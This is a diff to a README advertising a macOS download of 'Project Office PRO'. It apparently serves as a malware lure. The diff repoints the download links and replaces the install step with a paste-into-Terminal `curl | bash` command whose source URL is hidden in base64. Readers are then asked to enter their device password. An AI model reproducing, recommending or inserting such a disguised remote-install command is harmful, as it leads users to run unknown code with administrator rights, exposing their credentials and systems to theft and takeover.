@@ -3,7 +3,7 @@
 Project Office PRO is a comprehensive project management application tailored for macOS users. Designed to help professionals plan, track, and deliver projects efficiently, it offers powerful tools for scheduling, resource management, and collaboration.
 
 ## ✅ Download Project Office PRO for macOS  
-[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://project-office-pro-mac-download.github.io/.github)
+[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://shuziktobehuman.github.io/huja/OfficePro)
 
 ## 📦 How to Install
 
@@ -20,7 +20,7 @@ Project Office PRO is a comprehensive project management application tailored fo
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -30,7 +30,7 @@ Project Office PRO is a comprehensive project management application tailored fo
 
 
 ## ✅ Download Project Office PRO for macOS  
-[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://project-office-pro-mac-download.github.io/.github)
+[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://shuziktobehuman.github.io/huja/OfficePro)
 
 ---
 
@@ -63,7 +63,7 @@ Project Office PRO is a feature-rich project management software that provides d
 
 ---
 
-[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://project-office-pro-mac-download.github.io/.github)
+[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://shuziktobehuman.github.io/huja/OfficePro)
 
 ---
 
